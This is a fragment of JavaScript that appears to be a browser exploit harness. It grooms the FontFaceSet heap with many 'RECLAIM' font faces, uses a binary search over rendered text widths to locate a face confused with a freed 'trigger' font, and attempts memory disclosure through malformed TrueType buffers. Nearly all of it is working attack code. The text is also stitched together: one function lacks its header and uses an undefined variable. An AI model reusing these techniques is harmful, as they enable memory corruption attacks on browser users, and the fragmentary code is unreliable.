  const s = atob(FONT_B64);
  const bytes = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i);

function makeFontBuffer() {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);
  return copy.buffer;
}

// Create a MODIFIED font buffer with a specific advance width
// We modify the hmtx table to change the advance width of glyph 0
// This makes each RECLAIM face render at a UNIQUE width
function makeFontBufferWithWidth(uniqueId) {
  const copy = new Uint8Array(FONT_BYTES.length);
  copy.set(FONT_BYTES);

  // WOFF format: we need to find the hmtx table
  // For simplicity, we'll modify bytes at the end of the buffer
  // which in our minimal font correspond to the metrics
  // Each uniqueId maps to a different byte pattern
  const offset = copy.length - 8;
  copy[offset] = (uniqueId >> 8) & 0xFF;
  copy[offset + 1] = uniqueId & 0xFF;
  copy[offset + 2] = ((uniqueId * 3) >> 8) & 0xFF;
  copy[offset + 3] = (uniqueId * 3) & 0xFF;
  copy[offset + 4] = ((uniqueId * 7) >> 8) & 0xFF;
  copy[offset + 5] = (uniqueId * 7) & 0xFF;
  copy[offset + 6] = 0xDE;
  copy[offset + 7] = 0xAD;

  return copy.buffer;
}

function measureText(fontSpec, text) {
  const ctx = document.getElementById("c").getContext("2d");
  ctx.font = fontSpec;
  return ctx.measureText(text).width;
}

// Measure text width using a DOM element
function measureDOM(fontFamily, text) {
  const div = document.createElement("div");
  div.textContent = text;
  div.style.cssText = `position:absolute;left:-9999px;top:0;font:64px ${fontFamily};`;
  document.body.appendChild(div);
  const w = div.offsetWidth;
  document.body.removeChild(div);
  return w;
}

function fingerprintReclaimFaces() {
  log("Fingerprinting RECLAIM faces...");
  const fingerprints = {};

  for (let i = 0; i < reclaimFaces.length; i++) {
    const family = "RC_" + i;
    const w = measureText("64px " + family, "AB");
    fingerprints[i] = w;
  }

  log("Fingerprinted " + Object.keys(fingerprints).length + " faces");
  return fingerprints;
}

// ============================================================
//  PHASE 6: Cross-Write via Rendering
//  Since JS properties are cached, we need to detect
//  cross-object writes through RENDERING changes.
//
//  Strategy:
//  1. Measure trigger font rendering (baseline)
//  2. Modify a RECLAIM face (change its font data or properties)
//  3. Re-measure trigger font rendering
//  4. If rendering changed, the trigger is using that RECLAIM's data

function crossWriteViaRendering() {
  log("Running cross-write rendering test...");
  const results = [];

  // Baseline measurement
  const baseline = measureText("64px trigger", "AB");
  log("Baseline trigger width: " + baseline);

  // Test strategy: Remove RECLAIM faces one at a time and check
  // if trigger rendering changes. If it does, that RECLAIM was
  // being used by the selector for the trigger font.
  //
  // This is O(N) and much faster than cross-write property tests

  // First, batch test: remove groups of 256 and check
  const BATCH = 256;
  let foundBatch = -1;

  for (let batch = 0; batch < reclaimFaces.length; batch += BATCH) {
    const end = Math.min(batch + BATCH, reclaimFaces.length);

    // Remove this batch from document.fonts
    const removed = [];
    for (let i = batch; i < end; i++) {
      try {
        document.fonts.delete(reclaimFaces[i]);
        removed.push(i);
      } catch(e) {}
    }
    forceStyle();

    // Check if trigger rendering changed
    const testW = measureText("64px trigger", "AB");
    if (Math.abs(testW - baseline) > 0.01) {
      log("Rendering changed when batch " + batch + "-" + end + " removed! width=" + testW);
      foundBatch = batch;

      // Re-add the faces
      for (const i of removed) {
        try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
      }
      forceStyle();
      break;
    }

    // Re-add the faces
    for (const i of removed) {
      try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
    }
    forceStyle();
  }

  if (foundBatch >= 0) {
    log("Narrowing search in batch " + foundBatch + "...");

    // Binary search within the batch
    let lo = foundBatch;
    let hi = Math.min(foundBatch + BATCH, reclaimFaces.length);

    while (lo < hi) {
      const mid = Math.floor((lo + hi) / 2);

      // Remove faces [lo, mid)
      const removed = [];
      for (let i = lo; i <= mid; i++) {
        try {
          document.fonts.delete(reclaimFaces[i]);
          removed.push(i);
        } catch(e) {}
      }
      forceStyle();

      const testW = measureText("64px trigger", "AB");

      // Re-add
      for (const i of removed) {
        try { document.fonts.add(reclaimFaces[i]); } catch(e) {}
      }
      forceStyle();

      if (Math.abs(testW - baseline) > 0.01) {
        // Changed → confused face is in [lo, mid]
        hi = mid;
      } else {
        // Not changed → confused face is in (mid, hi]
        lo = mid + 1;
      }
    }

    confusedReclaimIdx = lo;
    log("★ BINARY SEARCH FOUND: RC_" + confusedReclaimIdx + " ★");

    // Verify
    try {
      document.fonts.delete(reclaimFaces[confusedReclaimIdx]);
      forceStyle();
      const verifyW = measureText("64px trigger", "AB");
      document.fonts.add(reclaimFaces[confusedReclaimIdx]);
      forceStyle();
      const restoreW = measureText("64px trigger", "AB");

      log("Verify: removed=" + verifyW + " restored=" + restoreW +
          " baseline=" + baseline + " match=" + (Math.abs(restoreW - baseline) < 0.01));

      if (Math.abs(verifyW - baseline) > 0.01) {
        results.push({
          found: true,
          index: confusedReclaimIdx,
          family: "RC_" + confusedReclaimIdx,
          baselineWidth: baseline,
          removedWidth: verifyW,
          restoredWidth: restoreW
        });
      }
    } catch(e) {
      log("Verify error: " + e.message);
    }
  } else {
    log("No batch caused rendering change — trying individual removal...");
    // Slower fallback: try removing individual faces
    for (let i = 0; i < Math.min(reclaimFaces.length, 512); i++) {
      try {
        document.fonts.delete(reclaimFaces[i]);
        forceStyle();
        const testW = measureText("64px trigger", "AB");
        document.fonts.add(reclaimFaces[i]);
        forceStyle();

        if (Math.abs(testW - baseline) > 0.01) {
          confusedReclaimIdx = i;
          log("★ INDIVIDUAL SEARCH FOUND: RC_" + i + " ★");
          results.push({ found: true, index: i });
          break;
        }
      } catch(e) {}
    }
  }

  return results;
}

  log("Attempting font metrics memory disclosure...");

  const METRIC_FACES = 256;
  let metricResults = [];

  for (let i = 0; i < METRIC_FACES; i++) {
    try {
      const buf = new ArrayBuffer(0x200);
      const view = new DataView(buf);

      // Write a unique pattern at the beginning
      view.setUint32(0, 0x00010000, true); // TrueType magic
      view.setUint32(4, i, true);          // Unique ID
      view.setUint32(8, 0x1F00, true);     // Number of tables
      view.setUint32(12, 0, true);

      const face = new FontFace("metric_" + i, buf, {
        unicodeRange: "U+0041"
      });
      document.fonts.add(face);
      forceStyle();

      if (face.status === "loaded" || face.status === "unloaded") {
        const m = measureText("64px metric_" + i, "A");
        metricResults.push({ idx: i, width: m, status: face.status });
      }

      document.fonts.delete(face);
    } catch(e) {}
  }
  forceStyle();

  // Analyze metrics for anomalies
  let widths = metricResults.map(r => r.width);
  let uniqueWidths = [...new Set(widths)];
  log("Metric faces: " + metricResults.length + " unique widths: " + uniqueWidths.length);

  for (const r of metricResults) {
    if (r.width > 0 && r.width < 1000) {
      log("  metric_" + r.idx + ": width=" + r.width + " status=" + r.status);
    }
  }

  return confusedIdx >= 0;
}

// ============================================================

function fullFontSetAnalysis() {
  log("Full FontFaceSet analysis...");
  let byStatus = {};
  let byFamily = {};

  for (const face of document.fonts) {
    try {
      const s = face.status;
      const f = face.family || "(none)";

      byStatus[s] = (byStatus[s] || 0) + 1;
      if (f.startsWith("RC_") || f === "trigger" || f.startsWith("hole_")) {
        if (!byFamily[f]) byFamily[f] = [];
        byFamily[f].push({
          status: s,
          style: face.style,
          weight: face.weight,
          display: face.display,
          stretch: face.stretch
        });
      }
    } catch(e) {}
  }

  log("Status distribution: " + JSON.stringify(byStatus));

  // Show key families
  for (const key of ["trigger", "RC_0", "RC_1", "hole_0", "hole_1"]) {
    if (byFamily[key]) {
      log("Family '" + key + "': " + JSON.stringify(byFamily[key]));
    }
  }

  // Count RECLAIM faces by status
  let rcLoaded = 0, rcError = 0, rcUnloaded = 0, rcOther = 0;
  for (const face of document.fonts) {
    try {
      if (face.family && face.family.startsWith("RC_")) {
        if (face.status === "loaded") rcLoaded++;
        else if (face.status === "error") rcError++;
        else if (face.status === "unloaded") rcUnloaded++;
        else rcOther++;
      }
    } catch(e) {}
  }
  log("RECLAIM status: loaded=" + rcLoaded + " error=" + rcError +
      " unloaded=" + rcUnloaded + " other=" + rcOther);

  return { byStatus, byFamily, rcLoaded, rcError };
}
